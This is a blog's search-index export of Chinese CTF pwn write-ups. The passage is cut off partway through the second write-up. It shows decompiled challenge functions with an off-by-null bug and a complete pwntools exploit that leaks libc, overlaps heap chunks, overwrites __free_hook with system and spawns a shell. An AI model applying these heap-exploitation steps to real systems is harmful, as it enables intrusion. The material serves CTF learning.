<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>off by null构造堆重叠(unsortedbin的double free)</title>
      <link href="/2021/11/13/off%20by%20null%E6%9E%84%E9%80%A0%E5%A0%86%E9%87%8D%E5%8F%A0(unsortedbin%E7%9A%84double%20free)/"/>
      <url>/2021/11/13/off%20by%20null%E6%9E%84%E9%80%A0%E5%A0%86%E9%87%8D%E5%8F%A0(unsortedbin%E7%9A%84double%20free)/</url>
      
        <content type="html"><![CDATA[<h1><span id="深育杯的-writebook">深育杯的 writebook</span></h1><h2><span id="add">add</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_ABC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> size; <span class="comment">// [rsp+Ch] [rbp-24h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> size_4; <span class="comment">// [rsp+10h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * i]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i == <span class="number">20</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Buy a new book&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Write on one side?&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Write on both sides?&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size_4);</span><br><span class="line">        <span class="keyword">if</span> ( size_4 == <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span> ( size_4 != <span class="number">2</span> )</span><br><span class="line">          <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;size: &quot;</span>);</span><br><span class="line">        __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">        <span class="keyword">if</span> ( size &gt; <span class="number">0x10F</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( size &lt;= <span class="number">0x1E0</span> )</span><br><span class="line">          &#123;</span><br><span class="line">            v1 = <span class="number">2</span> * i;</span><br><span class="line">            chunk_addr[v1] = <span class="built_in">malloc</span>(size);</span><br><span class="line">            <span class="keyword">if</span> ( !chunk_addr[<span class="number">2</span> * i] )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_20;</span><br><span class="line">LABEL_11:</span><br><span class="line">            chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>] = size;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;page #%d\n&quot;</span>, i);</span><br><span class="line">            <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;can you not write that much?&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;don&#x27;t waste pages -.-&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure><h2><span id="edit">edit</span></h2><p>off by null</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_E1D</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">    sub_D6C(chunk_addr[<span class="number">2</span> * v1], (<span class="keyword">unsigned</span> <span class="keyword">int</span>)chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>]);<span class="comment">//off by null</span></span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="delete">delete</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>((<span class="keyword">void</span> *)chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">    chunk_addr[<span class="number">2</span> * v1] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="show">show</span></h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">show</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Page: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">19</span> &amp;&amp; chunk_addr[<span class="number">2</span> * v1] )</span><br><span class="line">    <span class="built_in">puts</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="exp">exp</span></h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&#x27;./main&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;192.168.38.158&#x27;</span>,<span class="string">&#x27;2002&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./main&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add1</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add2</span>(<span class="params">size</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">page,con</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,con)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">page</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span>(<span class="params">page</span>):</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;:&#x27;</span>,<span class="built_in">str</span>(page))</span><br><span class="line"></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#0</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#1</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#2</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#3</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#4</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#5</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#6</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#7 d</span></span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#8</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#9</span></span><br><span class="line">add1(<span class="number">0xf0</span>)<span class="comment">#10</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">dele(i)</span><br><span class="line">add1(<span class="number">0</span>)<span class="comment">#0   进入unsortedbin泄露地址</span></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libcbase = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))+<span class="number">0x7f797bec98e8</span>-<span class="number">0x7f797c2b5678</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">8</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>+p64(<span class="number">0xe0</span>+<span class="number">0x40</span>))</span><br><span class="line">dele(<span class="number">9</span>)</span><br><span class="line">add1(<span class="number">0xd8</span>)<span class="comment">#1</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#2</span></span><br><span class="line">add1(<span class="number">0x30</span>)<span class="comment">#3</span></span><br><span class="line">dele(<span class="number">3</span>)<span class="comment">#为了让0x40大小的tcabin多一个chunk以申请出free_hook</span></span><br><span class="line">dele(<span class="number">8</span>)<span class="comment">#2与8重叠</span></span><br><span class="line">edit(<span class="number">2</span>,p64(libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))<span class="comment">#将free_hook写入tcabin</span></span><br><span class="line">print(<span class="string">&quot;libc:&quot;</span>+<span class="built_in">hex</span>(libcbase+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#3</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">add1(<span class="number">0x38</span>)<span class="comment">#4</span></span><br><span class="line">edit(<span class="number">4</span>,p64(libcbase+libc.sym[<span class="string">&#x27;system&#x27;</span>]))<span class="comment">#将free_hook改为system</span></span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">chunk 0x000000000202060</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1><span id="sctf_2019_easy_heap">sctf_2019_easy_heap</span></h1><h2><span id="主要函数">主要函数</span></h2><h3><span id="sub_cd0">sub_CD0</span></h3><p>main 最开始给的函数</p><p>mmap 了一段很大的内存，并给出了它的地址</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 <span class="title">sub_CD0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> fd; <span class="comment">// [rsp+4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 buf; <span class="comment">// [rsp+8h] [rbp-18h] BYREF</span></span><br><span class="line">  <span class="keyword">void</span> *v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">memset</span>(chunk_addr, <span class="number">0</span>, <span class="number">0x80</span>uLL);</span><br><span class="line">  fd = open(<span class="string">&quot;/dev/urandom&quot;</span>, <span class="number">0</span>);</span><br><span class="line">  buf = <span class="number">0LL</span>;</span><br><span class="line">  read(fd, &amp;buf, <span class="number">5uLL</span>);</span><br><span class="line">  buf &amp;= <span class="number">0xFFFFFFF000</span>uLL;</span><br><span class="line">  close(fd);</span><br><span class="line">  v3 = mmap((<span class="keyword">void</span> *)buf, <span class="number">0x1000</span>uLL, <span class="number">7</span>, <span class="number">34</span>, <span class="number">-1</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Mmap: %p\n&quot;</span>, v3);</span><br><span class="line">  count[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">  sub_CBD();</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="add">add</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_F89</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line">  <span class="keyword">void</span> *v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 size; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>]; ++i )</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;No more space.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Size: &quot;</span>);</span><br><span class="line">  size = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( size &gt; <span class="number">0x1000</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid size!&quot;</span>);</span><br><span class="line">  v2 = <span class="built_in">malloc</span>(size);</span><br><span class="line">  <span class="keyword">if</span> ( !v2 )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;Memory allocate failed!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>] = v2;</span><br><span class="line">  chunk_addr[<span class="number">2</span> * i] = size;</span><br><span class="line">  ++count[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;chunk at [%d] Pointer Address %p\n&quot;</span>, i, &amp;chunk_addr[<span class="number">2</span> * i + <span class="number">1</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="delete">delete</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_10C2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _DWORD *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v2 = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &lt;= <span class="number">0xF</span> &amp;&amp; *((_QWORD *)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="keyword">void</span> **)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>));</span><br><span class="line">    *((_QWORD *)&amp;chunk_addr + <span class="number">2</span> * v2 + <span class="number">1</span>) = <span class="number">0LL</span>;</span><br><span class="line">    *((_QWORD *)&amp;chunk_addr + <span class="number">2</span> * v2) = <span class="number">0LL</span>;</span><br><span class="line">    v0 = count;</span><br><span class="line">    --count[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v0) = <span class="built_in">puts</span>(<span class="string">&quot;Invalid index.&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">int</span>)v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span id="edit">edit</span></h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index: &quot;</span>);</span><br><span class="line">  v1 = sub_EE5();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> || !chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Invalid index.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Content: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> my_read(chunk_addr[<span class="number">2</span> * v1 + <span class="number">1</span>], chunk_addr[<span class="number">2</span> * v1]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//其中的 my_read 函数</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">sub_E2D</span><span class="params">(__int64 a1, <span class="keyword">unsigned</span> __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+13h] [rbp-Dh] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( read(<span class="number">0</span>, &amp;buf, <span class="number">1uLL</span>) &lt;= <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      perror(<span class="string">&quot;Read failed!\n&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( buf == <span class="string">&#x27;\n&#x27;</span> ) <span class="comment">//遇到回车不读入</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    *(_BYTE *)(a1 + i) = buf;  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( i == a2 )      <span class="comment">//off by null</span></span><br><span class="line">    *(_BYTE *)(i + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3><span 